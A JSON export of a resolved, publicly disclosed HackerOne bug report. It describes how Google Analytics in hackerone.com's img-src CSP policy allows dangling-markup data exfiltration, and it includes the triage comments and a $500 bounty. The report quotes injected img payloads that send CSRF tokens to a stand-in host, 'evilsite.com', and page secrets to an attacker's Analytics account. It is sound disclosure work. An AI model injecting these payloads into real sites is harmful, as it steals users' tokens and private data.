{"id":199779,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xOTk3Nzk=","url":"https://hackerone.com/reports/199779","title":"Google Analytics could be used as CSP bypass for data exfiltration on hackerone.com","state":"Closed","substate":"resolved","severity_rating":"low","readable_substate":"Resolved","created_at":"2017-01-19T23:35:16.499Z","submitted_at":"2017-01-19T23:35:16.499Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"aaron_costello","url":"/aaron_costello","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/89cpgLpC5JjJB9H6NtWYW3wJ/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":13,"url":"https://hackerone.com/security","handle":"security","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"HackerOne","twitter_handle":"Hacker0x01","website":"https://hackerone.com","about":"Vulnerability disclosure should be safe, transparent, and rewarding."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2017-03-26T08:17:54.922Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2017-02-24T08:17:43.415Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Greetings, I believe I may have found a way to bypass CSP on hackerone.com\n\nThe issue lies here:\n\n```\nimg-src 'self' data: www.google-analytics.com\n```\n\nAs you can imagine, how can image tags be used maliciously here to this safe site? Well, as you know, on google-analytics.com we have the ability to host user content.\n\nBefore we get into that, lets look at how image tags are processed.\nConsider the following injected content:\n```\n\u003cimg src='https://evilsite.com/steal_csrf_token?html=\n```\nA tag with an unclosed quote will capture all output up to the next matching quote. This could include security sensitive content on pages in the following way,:\n```\n\u003cimg src='https://evilsite.com/steal_csrf_token?html=\n\u003cform action=\"https://coinbase.com/poc\"\u003e\n\n\u003cinput type=\"hidden\" name=\"csrf_token\" value=\"some_csrf_token_value\"\u003e\n\u003c/form\u003e\n```\nThe resulting image element will send a request to https://evilsite.com/steal_csrf_token?html=/log_csrf?html=...some_csrf_token_value....\n\nAs a result, an attacker can leverage this dangling markup attack to exfiltrate CSRF tokens to a site of their choosing.\n\nThe issue\n----------\n\nFirst take a look at Google Analytics. Imagine a content injection that looks something like:\n```\n\u003c injection point \u003e\n\u003cp\u003esecret\u003c/p\u003e\n```\nThe Google Analytics’ ea parameter is used to log event actions and can contain arbitrary strings. An attacker could setup a Google Analytics account and then inject an image referencing their account:\n```\n\u003cimg src='https://www.google-analytics.com/collect?v=1\u0026tid=UA-55300588-1\u0026cid=3121525717\u0026t=event\u0026ec=email\u0026el=2111515817\u0026cs=newsletter\u0026cm=email\u0026cn=062413\u0026cm1=1\u0026ea=\n\u003cp\u003esecret\u003c/p\u003e\n```\nThis results in the following request, logging “secret” to their account:\n```\nhttps://www.google-analytics.com/collect?v=1\u0026tid=UA-77300477-1\u0026cid=2111515817\u0026t=event\u0026ec=email\u0026el=2111515817\u0026cs=newsletter\u0026cm=email\u0026cn=062413\u0026cm1=1\u0026ea=%3Cp%3Esecret%3C/p%3E\n```\n\nThe solution\n-------------\n\nSwap from using their image based system to an XHR based approach (https://developers.google.com/analytics/devguides/collection/analyticsjs/sending-hits#specifying_different_transport_mechanisms)\n\n\n\n","bounty_amount":"500.0","formatted_bounty":"$500","weakness":{"id":57,"name":"Violation of Secure Design Principles"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2017-03-26T08:17:43.444Z","allow_singular_disclosure_after":-143444574.76779324,"singular_disclosure_allowed":true,"vote_count":41,"voters":["delimitry","sp1d3rs","ngalog","icanthack","bugdiscloseguys","samet","unkn7wn","mpz","madrobot","eveeez","and 31 more..."],"severity":{"rating":"low","score":3.7,"author_type":"Team","metrics":{"attack_vector":"network","attack_complexity":"high","privileges_required":"none","user_interaction":"none","scope":"unchanged","confidentiality":"low","integrity":"none","availability":"none"}},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":1431575,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Reference: https://githubengineering.com/githubs-post-csp-journey/","automated_response":false,"created_at":"2017-01-19T23:56:01.363Z","updated_at":"2017-01-19T23:56:01.363Z","actor":{"username":"aaron_costello","cleared":true,"url":"/aaron_costello","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/89cpgLpC5JjJB9H6NtWYW3wJ/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1431725,"is_internal":false,"editable":false,"type":"Activities::ReportVulnerabilityTypesUpdated","message":"","automated_response":false,"created_at":"2017-01-20T02:30:54.825Z","updated_at":"2018-02-28T13:10:57.662Z","additional_data":{"added_weaknesses":[{"id":57,"name":"Violation of Secure Design Principles"}],"removed_weaknesses":[{"id":48,"name":"Denial of Service"},{"id":60,"name":"Cross-site Scripting (XSS) - Generic"}]},"actor":{"username":"reed","cleared":false,"url":"/reed","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/132/66d7eadcea16b878bb67bfd697b9542250a801a7_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1431728,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","automated_response":false,"created_at":"2017-01-20T02:32:00.514Z","updated_at":"2017-01-20T02:32:00.514Z","additional_data":{"old_severity":null,"new_severity":"Low (3.7)","old_severity_id":null,"new_severity_id":20561},"actor":{"username":"reed","cleared":false,"url":"/reed","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/132/66d7eadcea16b878bb67bfd697b9542250a801a7_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1431729,"is_internal":false,"editable":false,"type":"Activities::ReportTitleUpdated","message":"","automated_response":false,"created_at":"2017-01-20T02:32:35.017Z","updated_at":"2017-01-20T02:32:35.017Z","additional_data":{"old_title":"Unsafe CDN could be used as CSP bypass on Hackerone.com","new_title":"Google Analytics could be used as CSP bypass for data exfiltration on hackerone.com"},"actor":{"username":"reed","cleared":false,"url":"/reed","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/132/66d7eadcea16b878bb67bfd697b9542250a801a7_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1431730,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"We believe we've mitigated the issue you / GitHub describe(s). Can you confirm?","automated_response":false,"created_at":"2017-01-20T02:33:27.185Z","updated_at":"2017-01-20T02:33:27.185Z","actor":{"username":"reed","cleared":false,"url":"/reed","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/132/66d7eadcea16b878bb67bfd697b9542250a801a7_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1432003,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"This has indeed been mitigated, great response time!","automated_response":false,"created_at":"2017-01-20T08:04:03.597Z","updated_at":"2017-01-20T08:04:03.597Z","actor":{"username":"aaron_costello","cleared":true,"url":"/aaron_costello","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/89cpgLpC5JjJB9H6NtWYW3wJ/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1432010,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Awesome. Great to hear!\n\nNot sure if this will qualify for a bounty, as it's literally a copy/paste from GitHub's blog post today (minus to change to use `coinbase.com/poc`). However, but it did at least get us to make a change, and this is a valuable security enhancement, so we'll take that into account.\n\nWe'll be in touch in a few days.","automated_response":false,"created_at":"2017-01-20T08:09:41.929Z","updated_at":"2017-01-20T08:09:41.929Z","actor":{"username":"reed","cleared":false,"url":"/reed","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/132/66d7eadcea16b878bb67bfd697b9542250a801a7_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"aaron_costello","url":"/aaron_costello"},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1432014,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Much appreciated, thank you for the fast response!","automated_response":false,"created_at":"2017-01-20T08:12:05.036Z","updated_at":"2017-01-20T08:12:05.036Z","actor":{"username":"aaron_costello","cleared":true,"url":"/aaron_costello","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/89cpgLpC5JjJB9H6NtWYW3wJ/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1485774,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Any update on this?","automated_response":false,"created_at":"2017-02-14T20:54:02.586Z","updated_at":"2017-02-14T20:54:02.586Z","actor":{"username":"aaron_costello","cleared":true,"url":"/aaron_costello","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/89cpgLpC5JjJB9H6NtWYW3wJ/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1502881,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Hi @aaron_costello. First of all, I personally apologize for the massive delay on this. This is totally my fault, and I'm working on correcting this for the future. You should not have to wait this long ever.\n\nAs I said earlier, this is a valuable security enhancement that improve our defense-in-depth strategy, and while I hadn't seen the GitHub blog post at the time of your report, you took the time to report it to us and get us to act quickly. As such, we will award our minimum bounty amount.\n\nWe really do appreciate your report, and we hope you will continue to submit valuable reports to us. Happy hacking!","automated_response":false,"created_at":"2017-02-24T08:17:21.793Z","updated_at":"2017-02-24T08:17:21.793Z","actor":{"url":"/security","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"HackerOne"}},"bounty_amount":"500.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"security","collaborator":{"username":"aaron_costello","url":"/aaron_costello"},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1502883,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2017-02-24T08:17:43.428Z","updated_at":"2017-02-24T08:17:43.428Z","first_to_agree":true,"actor":{"username":"reed","cleared":false,"url":"/reed","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/132/66d7eadcea16b878bb67bfd697b9542250a801a7_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1563748,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2017-03-26T08:17:54.938Z","updated_at":"2017-03-26T08:17:54.938Z","actor":{"url":"/security","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"HackerOne"}},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}